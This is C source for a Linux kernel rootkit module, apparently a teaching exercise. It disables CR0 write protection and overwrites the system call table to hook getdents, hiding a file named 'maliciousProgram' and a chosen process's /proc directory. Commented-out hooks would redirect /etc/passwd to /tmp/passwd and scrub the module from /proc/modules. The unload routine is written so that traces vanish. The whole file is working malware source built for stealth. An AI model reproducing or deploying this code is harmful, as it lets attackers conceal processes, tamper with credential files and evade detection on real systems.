
#include <linux/module.h> // for all modules
#include <linux/init.h>   // for entry/exit macros
#include <linux/kernel.h> // for printk and other kernel bits
#include <asm/current.h>  // process information
#include <linux/sched.h>
#include <linux/highmem.h> // for changing page permissions
#include <asm/unistd.h>    // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/string.h>
#define BUFFLEN 256

static char *sn_pid = "blah";
module_param(sn_pid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);

/*
 * New, all-improved, singing, dancing, iBCS2-compliant getdents()
 * interface. 
 */
struct linux_dirent
{
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    char d_name[BUFFLEN];
};

//Macros for kernel functions to alter Control Register 0 (CR0)
//The CR0 register is 32 bits long on the 386 and higher processors. On x86-64 processors in long mode, it (and the other control registers) is 64 bits long.
//CR0 has various control flags that modify the basic operation of the processor.
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

/*/* disable protected mode
 
   I perform a not operation to 0x10000 ( so I have 0x01111). 
   Later I perform an AND operation between the current value 
   of the CR0 register and 0x01111. So the WP bit is set to 0 
   and the protected mode is disabled.
 

 
write_cr0 (read_cr0 () & (~ 0x10000));
 
 enable protected mode
 
   I perform an OR operation between the current value of 
   the CR0 register and 0x10000. So the WP bit is set to 1 
   and the protected mode is enabled.
    

    
write_cr0 (read_cr0 () | 0x10000);*/

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-3.13.0.77-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81078c50;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81078be0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-`$(uname -r)`/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above: find sys_call_table).
static unsigned long *sys_call_table = (unsigned long *)0xffffffff81e001a0;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
asmlinkage int (*original_close)(int fd);

/*
*
********************
* OTHER FUNCTIONS
********************
*
*/

//MODULE INIT
//1. hide [malicious program] from ‘ls’ and ‘find’
//2. hide the /proc/<maliciousProgram> directory from 'ls' and 'ps'
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{

    int nread, bpos;
    struct linux_dirent *d;
    char d_type;

    printk(KERN_INFO "entered sneaky_sys_getdents()!!!\n");

    nread = original_getdents(fd, dirp, count);
    for (bpos = 0; bpos < nread;)
    {
        d = (struct linux_dirent *)((char *)dirp + bpos);
        d_type = *((char *)dirp + bpos + (int)d->d_reclen - 1);
        if (((d_type == DT_REG) && (strcmp(d->d_name, "maliciousProgram") == 0)) ||
            ((d_type == DT_DIR) && (strcmp(d->d_name, sn_pid) == 0)))
        {
            memmove(d, (char *)d + (int)d->d_reclen, nread - bpos - (int)d->d_reclen);
            nread -= (int)d->d_reclen;
            break;
        }
        bpos += (int)d->d_reclen;
    }
    return nread;
}


//3. open the saved “/tmp/passwd” when a request to open the “/etc/passwd”
//a flag that indicates whether /proc/modules is open; if open, flag = fd
/*
static int flag = -1;
#define ORI_PASSWD_FILE "/etc/passwd"
#define TMP_PASSWD_FILE "/tmp/passwd"
#define PROC_MOD "/proc/modules"
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
    // printk(KERN_INFO "Very, very Sneaky!\n");
    if (strcmp(ORI_PASSWD_FILE, pathname) == 0)
    {
        //note that PASSWD_FILE and TMP_PASSWD_FILE have same number of bytes
        char tmp_buf[sizeof(ORI_PASSWD_FILE)];
        int ret;
        if (copy_from_user(tmp_buf, pathname, sizeof(ORI_PASSWD_FILE)))
        {
            return -EFAULT;
        }
        if (!copy_to_user((void *)pathname, TMP_PASSWD_FILE, sizeof(TMP_PASSWD_FILE)))
        {
            printk(KERN_INFO "successfully replace buffer [/etc/passwd] with [/tmp/passwd] !!!\n");
        }
        //now (const char*)pathname points to "/tmp/passwd"
        ret = original_call(pathname, flags);
        // reset the buffer back
        if (copy_to_user((void *)pathname, tmp_buf, sizeof(tmp_buf)))
        {
            return -EFAULT;
        }
        //now (const char*)pathname points to "/etc/passwd"
        return ret;
    }
    else if (strcmp(PROC_MOD, pathname) == 0)
    {
        int fd = original_call(pathname, flags);
        flag = fd;
        return fd;
    }
    else
    {
        return original_call(pathname, flags);
    }
}

// 4.remove the contents of the line for “rootkit” from the buffer of read data in the /proc/modules file
asmlinkage int sneaky_sys_close(int fd)
{
    if (fd == flag)
    {
        flag = -1;
    }
    return original_close(fd);
}

asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
{
    if (fd == flag)
    {
        ssize_t ret = original_read(fd, buf, count);
        //char *strstr(const char *haystack, const char *needle);
        char *start = strstr(buf, "rootkit");
        if (start != NULL)
        {
            char *end = strstr(start, "\n");
            int len = end - start + 1;
            memmove(start, end + 1, ret - (end - (char *)buf + 1));
            ret -= (ssize_t)len;
        }
        return ret;
    }
    else
    {
        return original_read(fd, buf, count);
    }
}*/

/*
*
********************
* MODULE INIT/EXIT
********************
*
*/

static int rootkit_init(void)
{
    struct page *page_ptr;

    //See /var/log/syslog for kernel print output
    printk(KERN_INFO "12:42:rootkit being loaded.\n");

    //Turn off write protection mode
    write_cr0(read_cr0() & (~0x10000)); //how ???

    //Get a pointer to the virtual page containing the address
    //of the system call table in the kernel.
    page_ptr = virt_to_page(&sys_call_table);
    //Make this page read-write accessible
    pages_rw(page_ptr, 1);

    //This is the magic! Save away the original 'open' system call
    //function address. Then overwrite its address in the system call
    //table with the function address of our new code.
   /* original_call = (void *)*(sys_call_table + __NR_open);
    *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
    */
    original_getdents = (void *)*(sys_call_table + __NR_getdents);
    *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
/*
    original_read = (void *)*(sys_call_table + __NR_read);
    *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

    original_close = (void *)*(sys_call_table + __NR_close);
    *(sys_call_table + __NR_close) = (unsigned long)sneaky_sys_close;
*/
    //Revert page to read-only
    pages_ro(page_ptr, 1);
    //Turn write protection mode back on
    //write_cr0(read_cr0() | 0x10000);

    return 0; // to show a successful load
}

static void rootkit_exit(void)
{
    struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  //*(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  //*(sys_call_table + __NR_read) = (unsigned long)original_read;
  //*(sys_call_table + __NR_close) = (unsigned long)original_close;
  
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
 // write_cr0(read_cr0() | 0x10000);
}

module_init(rootkit_init); // what's called upon loading
module_exit(rootkit_exit); // what's called upon unloading

MODULE_LICENSE("GPL");